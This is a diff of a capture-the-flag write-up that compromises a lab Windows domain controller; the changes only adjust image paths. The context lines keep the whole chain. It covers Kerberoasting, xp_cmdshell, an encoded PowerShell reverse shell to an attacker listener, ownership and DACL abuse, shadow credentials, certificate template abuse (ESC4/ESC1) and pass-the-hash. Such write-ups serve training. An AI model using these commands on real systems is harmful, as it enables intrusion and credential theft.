@@ -14,9 +14,8 @@ date: 2025-02-16
 nmap -p- -sS -n -Pn --min-rate 5000 -open 10.10.11.51 -oG allPorts
 ````
 
- > 
- > \[!Result\]-
- > ![Pasted image 20250216204247.png](assets/Pasted%20image%2020250216204247.png)
+ > [!Result]-
+ > ![Pasted image 20250216204247.png](../../../../assets/Pasted%20image%2020250216204247.png)
 
 * Now we now that the target machine is a windows enviroment, lets preforme some version scan and use some commons scripts against this ports
 
@@ -24,10 +23,10 @@ nmap -p- -sS -n -Pn --min-rate 5000 -open 10.10.11.51 -oG allPorts
 sudo nmap -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49689,49690,49691,49706,49722,49743,49810 -sCV --min-rate 5000 -n -Pn -open 10.10.11.51 -oN Targeted
 ````
 
- > 
- > \[!Result\]-
- > ![Pasted image 20250216205045.png](assets/Pasted%20image%2020250216205045.png)
- > ![Pasted image 20250216205113.png](assets/Pasted%20image%2020250216205113.png)
+
+ > [!Result]-
+ > ![Pasted image 20250216205045.png](../../../../assets/Pasted%20image%2020250216205045.png)
+ > ![Pasted image 20250216205113.png](../../../../assets/Pasted%20image%2020250216205113.png)
 
 * So we have this information to be highlighted
   * we are in front of a Domain controller (DC01.sequel.htb)
@@ -49,7 +48,7 @@ ldapdomaindump 10.10.11.51 -u 'sequel\rose' -p 'KxEPkKe6R8su' --authtype SIMPLE
 ````
 
  > [!Result]-
- > ![Pasted image 20250217010219.png](assets/Pasted%20image%2020250217010219.png)
+ > ![Pasted image 20250217010219.png](../../../../assets/Pasted%20image%2020250217010219.png)
 
 ## kerberos
 
@@ -59,7 +58,7 @@ ldapdomaindump 10.10.11.51 -u 'sequel\rose' -p 'KxEPkKe6R8su' --authtype SIMPLE
 netexec ldap 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --kerberoast kerb.txt
 ````
 
-![Pasted image 20250217020128.png](assets/Pasted%20image%2020250217020128.png)
+![Pasted image 20250217020128.png](../../../../assets/Pasted%20image%2020250217020128.png)
 
 * after trying crack him, they do not crack...
 
@@ -67,7 +66,7 @@ netexec ldap 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --kerberoast kerb.txt
 john kerb.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ````
 
-![Pasted image 20250219190902.png](assets/Pasted%20image%2020250219190902.png)
+![Pasted image 20250219190902.png](../../../../assets/Pasted%20image%2020250219190902.png)
 
 ## Bloodhaund enumeration
 
@@ -78,15 +77,15 @@ bloodhound-python -d sequel.htb -u rose -p KxEPkKe6R8su -c ALL -ns 10.10.11.51
 ````
 
 * And then import it to [bloodhaunt](tools/bloodhaunt.md), and we can see that there are only a user with admin rights
-  ![Pasted image 20250219192824.png](assets/Pasted%20image%2020250219192824.png)
+  ![Pasted image 20250219192824.png](../../../../assets/Pasted%20image%2020250219192824.png)
 
 There are 8 domain users
-![Pasted image 20250219195347.png](assets/Pasted%20image%2020250219195347.png)
+![Pasted image 20250219195347.png](../../../../assets/Pasted%20image%2020250219195347.png)
 
 * the users: `sql_svc` and `ca_svc` looks so good
-  ![Pasted image 20250219200216.png](assets/Pasted%20image%2020250219200216.png)
+  ![Pasted image 20250219200216.png](../../../../assets/Pasted%20image%2020250219200216.png)
   he can access to the sql data base
-  ![Pasted image 20250219200455.png](assets/Pasted%20image%2020250219200455.png)
+  ![Pasted image 20250219200455.png](../../../../assets/Pasted%20image%2020250219200455.png)
   with this user we can issue certs, so lets use certipy-ad to enumerate CA
 
 ## certipy-ad enumeration
@@ -105,7 +104,7 @@ certipy find -bloodhound -vulnerable -ns 10.10.11.51 -dc-ip 10.10.11.51 -u rose@
 
 
 * lets read the result, but own user dont have access
-  ![Pasted image 20250219202033.png](assets/Pasted%20image%2020250219202033.png)
+  ![Pasted image 20250219202033.png](../../../../assets/Pasted%20image%2020250219202033.png)
 
 ## SMB Enumeration
 
@@ -121,12 +120,12 @@ impacket-smbclient sequel/rose:KxEPkKe6R8su@10.10.11.51
 
  
  > [!Result]-
- > ![Pasted image 20250217010750.png](assets/Pasted%20image%2020250217010750.png)
+ > ![Pasted image 20250217010750.png](../../../../assets/Pasted%20image%2020250217010750.png)
 
 * we have read permission over "accounting department", lets download the content
-  ![Pasted image 20250219202706.png](assets/Pasted%20image%2020250219202706.png)
+  ![Pasted image 20250219202706.png](../../../../assets/Pasted%20image%2020250219202706.png)
 * if we try to open with LibreOffice, the documents are corrupted
-  ![Pasted image 20250219203051.png](assets/Pasted%20image%2020250219203051.png)
+  ![Pasted image 20250219203051.png](../../../../assets/Pasted%20image%2020250219203051.png)
 * but xlsx files are archives that contains spreadsheets so we can unzip him and check
 
 ````bash
@@ -134,7 +133,7 @@ unzip accouns.xlsx
 libreoffice xl/sharedStrings.xml
 ````
 
-![Pasted image 20250219203902.png](assets/Pasted%20image%2020250219203902.png)
+![Pasted image 20250219203902.png](../../../../assets/Pasted%20image%2020250219203902.png)
 
 * BOOM! we have some password, we can use https://jumpshare.com/viewer/xlsx to better readability
 
@@ -164,7 +163,7 @@ enable_xp_cmdshell
 RECONFIGURE
 ````
 
-![Pasted image 20250220115526.png](assets/Pasted%20image%2020250220115526.png)
+![Pasted image 20250220115526.png](../../../../assets/Pasted%20image%2020250220115526.png)
 
 * we can try to get a revershell with a payload (https://www.revshells.com/), first start the listener
 
@@ -181,17 +180,17 @@ rlwrap -cAr nc -nlvp 4444
  > xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA4ADMAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
  > ````
 
-![Pasted image 20250220120007.png](assets/Pasted%20image%2020250220120007.png)
+![Pasted image 20250220120007.png](../../../../assets/Pasted%20image%2020250220120007.png)
 
 * perfect now the have access to the system, lets enumerate some interesting resources
-  ![Pasted image 20250220122514.png](assets/Pasted%20image%2020250220122514.png)
+  ![Pasted image 20250220122514.png](../../../../assets/Pasted%20image%2020250220122514.png)
 * Perfect!, now we have an other password `WqSZAF6CysDQbGb3`, lets tests this password to the users that we dont have password yet
 
 ````bash
 nxc smb 10.10.11.51 -u ./users -p ./passwords -k --continue-on-success | grep -e "[+]"
 ````
 
-![Pasted image 20250220123855.png](assets/Pasted%20image%2020250220123855.png)
+![Pasted image 20250220123855.png](../../../../assets/Pasted%20image%2020250220123855.png)
 
 # Lateral Movement
 
@@ -202,12 +201,12 @@ evil-winrm --ip 10.10.11.51 --user ryan --password WqSZAF6CysDQbGb3
 ````
 
 * get the user flag
-  ![Pasted image 20250220124847.png](assets/Pasted%20image%2020250220124847.png)
+  ![Pasted image 20250220124847.png](../../../../assets/Pasted%20image%2020250220124847.png)
 
 # Privilege Escalation
 
 * if we check [bloodhaunt](tools/bloodhaunt.md) we can see that ryan has (as first degree object control) writeOwner over `CA_SVC` user
-  ![Pasted image 20250220125521.png](assets/Pasted%20image%2020250220125521.png)
+  ![Pasted image 20250220125521.png](../../../../assets/Pasted%20image%2020250220125521.png)
 
 If we have WriteOwner over a:
 
@@ -223,7 +222,7 @@ If we have WriteOwner over a:
   * We can modify it.
   * GPO Attacks as well other DACL abuses (such as computer attacks).
 * that's means that we hace control over a privileged user
-  ![Pasted image 20250220125733.png](assets/Pasted%20image%2020250220125733.png)
+  ![Pasted image 20250220125733.png](../../../../assets/Pasted%20image%2020250220125733.png)
 
 * first we have to get the `ca_svc` hash using kerberoasting technique using [targetedKerberoast.py](tools/targetedKerberoast.py.md)
 
@@ -231,7 +230,7 @@ If we have WriteOwner over a:
 python3 targetedKerberoast.py -v -d sequel.htb -u rose -p KxEPkKe6R8su --request-user ca_svc -o ca_svc.kerb
 ````
 
-![Pasted image 20250220135034.png](assets/Pasted%20image%2020250220135034.png)
+![Pasted image 20250220135034.png](../../../../assets/Pasted%20image%2020250220135034.png)
  > but we cant brute force him
 
 * modify the ownership over `ca_svc` using [owneredit.py](tools/owneredit.py.md)
@@ -240,7 +239,7 @@ python3 targetedKerberoast.py -v -d sequel.htb -u rose -p KxEPkKe6R8su --request
 owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' sequel.htb/ryan:WqSZAF6CysDQbGb3
 ````
 
-![Pasted image 20250220135700.png](assets/Pasted%20image%2020250220135700.png)
+![Pasted image 20250220135700.png](../../../../assets/Pasted%20image%2020250220135700.png)
 
 
  > [!warning] You have to try it some times, because the first time i have run the script, the user was not the correct
@@ -251,7 +250,7 @@ owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' sequel.htb/ryan:Wq
 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' sequel.htb/ryan:WqSZAF6CysDQbGb3
 ````
 
-![Pasted image 20250220133230.png](assets/Pasted%20image%2020250220133230.png)
+![Pasted image 20250220133230.png](../../../../assets/Pasted%20image%2020250220133230.png)
 
 * Using [pywhisker.py](tools/pywhisker.py.md)
 
@@ -259,8 +258,8 @@ dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_
 python3 pywhisker.py -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 --target "CA_SVC" --action "add" --filename CACert --export PEM
 ````
 
-![Pasted image 20250220140456.png](assets/Pasted%20image%2020250220140456.png)
-![Pasted image 20250220141515.png](assets/Pasted%20image%2020250220141515.png)
+![Pasted image 20250220140456.png](../../../../assets/Pasted%20image%2020250220140456.png)
+![Pasted image 20250220141515.png](../../../../assets/Pasted%20image%2020250220141515.png)
 
 * We can have full control over `ac_svc` so lets request a TGT for this user, using [gettgtpkinit.py](tools/gettgtpkinit.py.md)
 
@@ -268,13 +267,13 @@ python3 pywhisker.py -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 --target "CA_SVC"
 python3 ../../PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CACert_priv.pem sequel.htb/ca_svc ca_svc.ccache
 ````
 
-![Pasted image 20250220151614.png](assets/Pasted%20image%2020250220151614.png)
+![Pasted image 20250220151614.png](../../../../assets/Pasted%20image%2020250220151614.png)
 
 
  > [!info] save this key for the next step `2c9b71a0695508a8e51[snip]6eb5db62ddbc86b1a`
 
 * Perfect now we can use this file `.cache` to get the NTLM hash of the user
-  ![Pasted image 20250220150514.png](assets/Pasted%20image%2020250220150514.png)
+  ![Pasted image 20250220150514.png](../../../../assets/Pasted%20image%2020250220150514.png)
 
 
  > [!Warning]- We need to set this variable `KRB5CCNAME` with this value `/path/to/ca_svc.ccache`
@@ -289,7 +288,7 @@ python3 ../../PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CAC
 python3 ../../PKINITtools/getnthash.py -key 2c9b71a0695508a8e51[snip]62ddbc86b1a sequel.htb/ca_svc
 ````
 
-![Pasted image 20250220151855.png](assets/Pasted%20image%2020250220151855.png)
+![Pasted image 20250220151855.png](../../../../assets/Pasted%20image%2020250220151855.png)
 
 * So we got the NT hash we can use it to pass-the-hash of the user `ca_svc`
 
@@ -297,7 +296,7 @@ python3 ../../PKINITtools/getnthash.py -key 2c9b71a0695508a8e51[snip]62ddbc86b1a
 nxc smb 10.10.11.51 -u 'ca_svc' -H '3b181b91[snip]bc2b7fce' -k --continue-on-success | grep -e "[+]"
 ````
 
-![Pasted image 20250220152234.png](assets/Pasted%20image%2020250220152234.png)
+![Pasted image 20250220152234.png](../../../../assets/Pasted%20image%2020250220152234.png)
 
 * Nice! NT hash works perfectly, we can run [certify](tools/certify.md) again but with this credentials
 
@@ -305,10 +304,10 @@ nxc smb 10.10.11.51 -u 'ca_svc' -H '3b181b91[snip]bc2b7fce' -k --continue-on-suc
 certipy find -stdout -vulnerable -ns 10.10.11.51 -dc-ip 10.10.11.51 -u ca_svc@sequel.htb -hashes :'3b181b914e7[snip]c2b7fce'
 ````
 
-![Pasted image 20250220152818.png](assets/Pasted%20image%2020250220152818.png)
+![Pasted image 20250220152818.png](../../../../assets/Pasted%20image%2020250220152818.png)
 
 * this cert is vulnerable to the [EZC4 attack vector](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4) (As we are part of `cert publisher` group we can attack)
-  ![Pasted image 20250220153000.png](assets/Pasted%20image%2020250220153000.png)
+  ![Pasted image 20250220153000.png](../../../../assets/Pasted%20image%2020250220153000.png)
 
 * lest perform the attack,
 
@@ -316,7 +315,7 @@ certipy find -stdout -vulnerable -ns 10.10.11.51 -dc-ip 10.10.11.51 -u ca_svc@se
 certipy template -username ca_svc@sequel.htb -hashes :'3b181b914e7a9d5508ea1e20bc2b7fce' -template DunderMifflinAuthentication -save-old
 ````
 
-![Pasted image 20250220153352.png](assets/Pasted%20image%2020250220153352.png)
+![Pasted image 20250220153352.png](../../../../assets/Pasted%20image%2020250220153352.png)
 
 * Now the certificate is vulnerable to [ESC1 attack vector](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1)
 
@@ -324,13 +323,13 @@ certipy template -username ca_svc@sequel.htb -hashes :'3b181b914e7a9d5508ea1e20b
 certipy req -username ca_svc@sequel.htb -hashes :'3b181b914e7[snip]1e20bc2b7fce' -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51
 ````
 
-![Pasted image 20250220154109.png](assets/Pasted%20image%2020250220154109.png)
+![Pasted image 20250220154109.png](../../../../assets/Pasted%20image%2020250220154109.png)
 
 
  >[!error]- you have to run ESC1 instantly after ESC4, if u run this command like 10-15s later u will the a DNS crash, like this
- > ![Pasted image 20250220154424.png](assets/Pasted%20image%2020250220154424.png)
+ > ![Pasted image 20250220154424.png](../../../../assets/Pasted%20image%2020250220154424.png)
  > do:
- > ![Pasted image 20250220154551.png](assets/Pasted%20image%2020250220154551.png)
+ > ![Pasted image 20250220154551.png](../../../../assets/Pasted%20image%2020250220154551.png)
 
 * perfect now we have a certificate to authenticate Administrator into DC, we can use [certify](tools/certify.md) to get the NTLM hash of this user
 
@@ -338,7 +337,7 @@ certipy req -username ca_svc@sequel.htb -hashes :'3b181b914e7[snip]1e20bc2b7fce'
 certipy auth -pfx administrator.pfx -domain sequel.htb
 ````
 
-![Pasted image 20250220154841.png](assets/Pasted%20image%2020250220154841.png)
+![Pasted image 20250220154841.png](../../../../assets/Pasted%20image%2020250220154841.png)
 
 * lets perform a pass-the-hash attack
 
@@ -346,7 +345,7 @@ certipy auth -pfx administrator.pfx -domain sequel.htb
 evil-winrm --ip 10.10.11.51 -u Administrator -H '7a8d4e[snip]60f75e5a0b3ff'
 ````
 
-![Pasted image 20250220155628.png](assets/Pasted%20image%2020250220155628.png)
+![Pasted image 20250220155628.png](../../../../assets/Pasted%20image%2020250220155628.png)
 
 * Now we are admin
-  ![Pasted image 20250220160118.png](assets/Pasted%20image%2020250220160118.png)
+  ![Pasted image 20250220160118.png](../../../../assets/Pasted%20image%2020250220160118.png)
